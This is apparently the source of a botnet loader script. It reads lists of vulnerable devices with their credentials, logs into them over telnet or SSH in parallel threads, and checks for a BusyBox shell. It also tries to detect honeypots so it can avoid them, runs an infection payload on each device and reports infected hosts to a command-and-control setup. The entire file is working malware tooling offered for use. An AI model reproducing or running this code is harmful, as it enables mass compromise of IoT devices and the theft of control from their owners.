from utils_class import Telnet, Database, Console, Tools, Ssh
import argparse, time, threading

__CSTRING__ = '#conn_str#'
__PAYLOAD__ = '#infect_payload#'

class Loader:
    def __init__(self, ip: str, port: int, thread: int, list_: str, protocol: str):
        self.console = Console.Console()
        self.ip_tools = Tools.IP_Tools()
        self.protocol = protocol
        self.thread = thread
        self.devices = []
        self.list = list_
        self.port = port
        self.run = 0
        self.ip = ip
    
    def load_device(self):
        if self.list == 'database':
            for device in Database.Database(__CSTRING__).get_telnet_bot():
                self.devices.append(device)
        else:
            with open('./vuln.txt', 'r+') as vuln_file:
                for device in vuln_file:
                    try:
                        device = device.split('\n')[0].split(' ')
                        self.devices.append({'username': device[1].split(':')[0], 'password': device[1].split(':')[1], 'ip': device[0].split(':')[0], 'port': device[0].split(':')[1]})
                    except:
                        pass

            self.console.print_success(f'Loading {len(self.devices)} devices')

    def infect_telnet_thread(self, ip: str, port: int, username: str, password: str):
        Session = Telnet.Telnet(ip, port, username, password)
        self.run += 1
        
        if not Session.connect():
            return
        
        data = ''
        for cmd in ['sh', 'shell', 'help', 'busybox'] if Session.prompt() in ['#', '$', '%', '@'] else ['cat | sh', 'sh', 'busybox']:
            data += str(Session.run_command(cmd))
        
        for math in ['BusyBox', 'Built-in']:
            if math in data and 'unrecognized' not in data:
                if Session.run_command('ls /proc/1/') == '' and '@' in Session.prompt():
                    lookup = self.ip_tools.ip_lookup(ip)
                    self.console.print_info(f'Honeypot detected: {username}@{ip} -> {lookup["ipType"]} -> {lookup["country"]} -> {Session.prompt()}')
                    return

                Session.run_command(__PAYLOAD__)
                self.console.print_success(f'Infected: {username}@{ip}:{password}')
        
        Session.disconnect()
        self.run -= 1
    
    def infect_ssh_thread(self, ip: str, port: int, username: str, password: str):
        Session = Ssh.Ssh(ip, port, username, password)
        self.run += 1
        
        if not Session.connect():
            return
        
        if Session.run_command('ls /proc/1/') == '':
            lookup = self.ip_tools.ip_lookup(ip)
            self.console.print_info(f'Honeypot detected: {username}@{ip} -> {lookup["ipType"]} -> {lookup["country"]}')
            return

        Session.run_command(__PAYLOAD__)
        self.console.print_success(f'Infected: {username}@{ip}:{password}')
        
        Session.disconnect()
        self.run -= 1

    def start(self):
        self.console.loader_banner()
        self.load_device()

        for device in self.devices:
            ip, port, username, password = device['ip'], int(device['port']), device['username'], device['password']

            while self.run > self.thread:
                time.sleep(1)
            
            threading.Thread(target= self.infect_telnet_thread if self.protocol == 'telnet' else self.infect_ssh_thread, args=(ip, port, username, password,)).start()

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('cnc',  help= 'C&C Server ip')
    p.add_argument('port', help= 'C&C Server port')
    p.add_argument('thread', help= 'Max thread')
    p.add_argument('list', help= 'Device vuln list', choices= ['file', 'database'])
    p.add_argument('protocol', help= 'Connection protocol', choices= ['telnet', 'ssh'])
    args = p.parse_args()
    
    Loader(args.cnc, int(args.port), int(args.thread), args.list, args.protocol).start()